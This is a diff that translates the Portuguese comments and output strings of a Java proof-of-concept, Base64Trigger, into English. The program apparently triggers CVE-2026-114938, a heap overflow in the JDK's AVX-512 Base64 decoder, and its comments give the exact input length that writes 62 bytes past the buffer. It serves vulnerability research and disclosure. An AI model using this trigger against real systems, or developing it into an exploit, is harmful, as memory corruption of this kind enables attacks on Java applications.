@@ -3,21 +3,21 @@ import java.util.Arrays;
 import java.util.Base64;
 
 /**
- * Trigger bounded para CVE-2026-114938.
+ * Bounded trigger for CVE-2026-114938.
  *
- * Primitiva: Quang Luong / Calif.io (advisory publico).
- * Harness e derivacao do comprimento: eduxcode (github.com/eduxcode).
+ * Primitive: Quang Luong / Calif.io (public advisory).
+ * Lab and trigger-length derivation: eduxcode (github.com/eduxcode).
  *
- * O gatilho precisa de DUAS condicoes:
- *   - length > 128, senao o stub cai no loop escalar (gate `cmpl(length,128)`);
- *   - (length % 64) em {1,2,3}, para sobrar uma cauda de 1..3 bytes com '='.
- * Com 129 bytes (128 'A' + '='): dois blocos de 64, cauda de 1 byte, e a
- * store de 64 bytes cai em dp=96 de um buffer de 98 -> 62 bytes alem.
+ * The trigger needs TWO conditions:
+ *   - length > 128, otherwise the stub falls back to the scalar loop (gate `cmpl(length,128)`);
+ *   - (length % 64) in {1,2,3}, so a 1..3 byte tail with '=' remains.
+ * With 129 bytes (128 'A' + '='): two 64-byte blocks, a 1-byte tail, and the
+ * 64-byte store lands at dp=96 of a 98-byte buffer -> 62 bytes past it.
  *
- * 64+'=' e 128+'=' NAO disparam: ficam no caminho escalar. Use um processo
- * por comprimento (a primeira excecao desotimiza decode0).
+ * 64+'=' and 128+'=' do NOT trigger: they stay on the scalar path. Use one process
+ * per length (the first exception deoptimizes decode0).
  *
- * Uso: java Base64Trigger [quantidadeDeA]
+ * Usage: java Base64Trigger [numberOfAs]
  */
 public final class Base64Trigger {
 
@@ -29,7 +29,7 @@ public final class Base64Trigger {
         int chars = args.length > 0 ? Integer.parseInt(args[0]) : 128;
         Base64.Decoder dec = Base64.getDecoder();
 
-        // 192 > 128: aquece o caminho AVX-512 de verdade
+        // 192 > 128: warms up the real AVX-512 path
         byte[] valid = "A".repeat(192).getBytes(StandardCharsets.US_ASCII);
         byte[] scratch = new byte[SCRATCH_SIZE];
         long acc = 0;
@@ -46,8 +46,8 @@ public final class Base64Trigger {
     private static boolean attempt(Base64.Decoder dec, int chars) {
         int inLen = chars + 1;                                   // + '='
         int paddings = 1;
-        int bufferLen = 3 * ((inLen + 3) / 4) - paddings;        // alocacao da JDK
-        int dp = 48 * (inLen / 64);                              // store da cauda
+        int bufferLen = 3 * ((inLen + 3) / 4) - paddings;        // JDK allocation
+        int dp = 48 * (inLen / 64);                              // tail store
         int lastExpected = dp + 63;
         int oob = lastExpected - (bufferLen - 1);
 
@@ -58,7 +58,7 @@ public final class Base64Trigger {
         try {
             dec.decode(("A".repeat(chars) + "=").getBytes(StandardCharsets.US_ASCII), target);
         } catch (IllegalArgumentException expected) {
-            rejected = true;                                      // rejeita depois de escrever
+            rejected = true;                                      // rejects after writing
         }
 
         int changed = 0, first = -1, last = -1;
@@ -75,9 +75,9 @@ public final class Base64Trigger {
                 && first == 0 && last == lastExpected && oob == 62;
 
         System.out.printf(
-            "trigger=%dx'A'+'=' inLen=%d buffer=%d dp=%d rejeitado=%s alterados=%d janela=[%d,%d] OOB=%d -> %s%n",
+            "trigger=%dx'A'+'=' inLen=%d buffer=%d dp=%d rejected=%s changed=%d window=[%d,%d] OOB=%d -> %s%n",
             chars, inLen, bufferLen, dp, rejected, changed, first, last, oob,
-            ok ? "HIT" : "sem corrupcao");
+            ok ? "HIT" : "no corruption");
         return ok;
     }
 }
